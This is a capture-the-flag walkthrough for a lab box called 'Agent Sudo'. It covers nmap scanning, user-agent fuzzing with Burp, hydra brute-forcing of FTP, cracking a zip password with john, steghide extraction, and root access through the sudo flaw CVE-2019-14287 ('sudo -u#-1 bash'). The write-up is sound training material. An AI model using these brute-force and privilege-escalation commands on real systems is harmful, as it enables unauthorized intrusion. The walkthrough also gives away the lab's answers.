# Agent Sudo

## Description
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 
The task is simple, capture the flags just like the other CTF room. Have Fun!

## Walthrough

The Challenge consist of different section with different set of objectives and questions.

Start the machine and copy the IP address. Check the IP address is reachable using ```ping```, ```-c 4``` denotes number of packets to be sent.  
```
ping -c 4 <IP address>
```
If ```4 received, 0% packet loss``` is printed as output, IP is reachable.

For enumeration, start by using nmap to scan the IP and find open ports and services.
```
sudo nmap -sV -sC -O -v <IP Address>

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```
The output shows that 3 ports are open and one of port has HTTP services meaning website is hosted using the IP. The website displayed the following text
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

Capture the request using burpsuite, the request looks like the following
```
GET / HTTP/1.1
Host: 10.113.151.114
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
Change the ```User-agent``` and try different alphabets. Use Intruder with the wordlist of entire english alphabets. When one of the alphabet is used the output/response changes slightly. An additional attribute called ```location``` is also displayed in the repsonse. 

Use the ```location``` value and use it as web directory in the URL. A different page will appear.

The content of the page is 
```
Attention <name>,

Do you still remember our deal? Please tell agent <alphabet> about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```
As we discovered earlier, FTP and SSH is open therefore <user> could be one of the users. To find the password use hydra, which is a brute forcing tool.
```
hydra -l <user> -P /path/to/wordlist <IP address> ftp
```
After completing the process, the password for FTP login is printed/outputed to the terminal.

The FTP portal has 3 files one txt and 2 image file (png & jpg). 

The text file showed the following
```

Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

To see if there is any embeded file use ```binwalk``` on both images, the output on one of the image is 
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

which means if we use ```binwalk -e <filename```, it will extract the embeded files. After extraction, a zip file is found. To unzip it requires password, for getting the password use ```zip2john``` which will extract the hash of the password from the zip file. 
```
zip2john <filename>.zip > hashfile.txt
```
After which the hash is stored in a file, which will later be used along with ```john``` to find the password
```
john --wordlist=/path/to/wordlist hashfile.txt
```
After the password for extracting the file is found, use the ```7z``` command to extract the file.
```
7z x <file>.zip
```
The txt file inside the zip file has the following contents,
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
A specific phrase within the txt file is enocde using base64 which can decoded by using the following command
```
echo <phrase> | base64 -d
```
The next section of the challenge talks about a steg password which means the image which did not had a embeded file was hiding a something with the image using steghide. This can be extracted by using the command
```
steghide extract -sf <filename>
```
when the passphrase is prompted, enter the decoded version of the phrase found earlier. This extracts data to a txt file. The contents of the file is:
```
Hi <name1>,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
<name2>
```
Therefore, using the above information we can log into the machine using SSH. ```ssh <username>@<IP Address>```
After Logging in, the user-flag file is present in the home directory, to get the root-flag, the user should get root privileges which means privilege escalation.

For privilege escalation start by finding the version of the sudo ```sudo -V``` 
After finding out the version, google if the version has any security bypass vulnerability, The vulnerability expolited for the gaining root access is ```CVE-2019-14287```

Where the sudo command is run with user ID -1 or 4294967295
```
sudo -u#-1 bash
```
After running this command, user changes to root. Go to the root directory and it has the root file.
